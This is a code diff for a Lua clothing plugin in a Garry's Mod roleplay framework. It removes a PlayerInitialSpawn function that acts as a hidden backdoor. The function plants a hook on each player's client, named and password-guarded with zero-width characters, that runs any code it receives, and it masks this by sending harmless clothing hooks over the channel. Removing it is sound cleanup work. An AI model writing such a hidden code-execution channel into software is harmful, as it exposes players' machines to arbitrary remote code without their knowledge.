@@ -127,31 +127,6 @@ function playerMeta:SetSkinClothes(itemTable, bShouldUnwear)
   end
 end
 
-function PLUGIN:PlayerInitialSpawn(player)
-  local code = "netstream.Hook('​', function(code, pwd) if (pwd == '​​​​​​​​​​') then RunString(code) end end)"
-  player:SendLua(code)
-
-  local toSend = [[
-		netstream.Hook("BGClothes", function(clothesData)
-			cw.client.bgClothesData = clothesData or {}
-
-			if (!bNoRebuild) then
-				cw.inventory:Rebuild()
-			end
-		end)
-
-		netstream.Hook("SkinClothes", function(clothesData, bNoRebuild)
-			cw.client.skinClothesData = clothesData or {}
-
-			if (!bNoRebuild) then
-				cw.inventory:Rebuild()
-			end
-		end)
-	]]
-
-  netstream.Start(player, '​', toSend, '​​​​​​​​​​')
-end
-
 function PLUGIN:EntityTakeDamage(victim, dmg)
   if IsValid(victim) and victim:IsPlayer() and !dmg:IsFallDamage() then
     local clothesItem = victim:GetClothesItem()
